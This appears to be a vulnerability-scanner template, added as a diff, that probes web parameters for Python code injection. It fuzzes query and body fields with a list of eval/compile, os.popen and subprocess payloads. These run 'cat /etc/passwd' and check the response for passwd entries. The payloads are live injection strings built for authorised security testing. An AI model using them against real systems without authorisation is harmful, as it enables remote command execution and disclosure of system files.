@@ -1,0 +1,52 @@
+id: python-code-injection
+
+info:
+  name: Python Code Injection
+  author: ritikchaddha
+  severity: high
+  tags: python,dast,injection,cmdi,vuln
+
+variables:
+  Command: "cat /etc/passwd"
+
+http:
+  - pre-condition:
+      - type: dsl
+        dsl:
+          - 'method == "GET"'
+          - 'method == "POST"'
+          - 'method == "PUT"'
+    payloads:
+      injection:
+        - eval(compile("""for x in range(1):\\n import os\\n os.popen(r'{{Command}}').read()""",'','single'))
+        # without loop, one expression
+        - eval(compile("""__import__('os').popen(r'{{Command}}').read()""",'','single'))
+        # without loop, one expression
+        - eval(compile("""__import__('subprocess').check_output(r'{{Command}}',shell=True)""",'','single'))
+        # without compile
+        - __import__('os').popen('{{Command}}').read()
+        # multiple expressions, separated by commas
+        - str("-"*50),__import__('os').popen('{{Command}}').read()
+        # multiple statements, separated by semicolons
+        - eval(compile("""__import__('os').popen(r'{{Command}}').read();import time;time.sleep(2)""",'','single'))
+        - eval(compile("""__import__('subprocess').check_output(r'{{Command}}',shell=True);import time;time.sleep(2)""",'','single'))
+        # with `for` loop technique, without global __import__ using subprocess.popen
+        - eval(compile("""for x in range(1):\n import os\n os.popen(r'{{Command}}').read()""",'','single'))
+        - eval(compile("""for x in range(1):\n import subprocess\n subprocess.Popen(r'{{Command}}',shell=True, stdout=subprocess.PIPE).stdout.read()""",'','single'))
+        - eval(compile("""for x in range(1):\n import subprocess\n subprocess.check_output(r'{{Command}}',shell=True)""",'','single'))
+
+    fuzzing:
+      - parts:
+          - query
+          - body
+        type: replace
+        fuzz:
+          - "{{injection}}"
+
+    stop-at-first-match: true
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - 'root:.*:0:0:'
+# digest: 4b0a00483046022100cd9bba97f258c066f8503c51a37f32763c0c776da2023179cb9665d4e6c397d3022100b04ff58ead57ba70bb1b64bab48d1a4f591f5515215631baeecbbe96e621cf15:922c64590222798bb761d5b6d8e72950
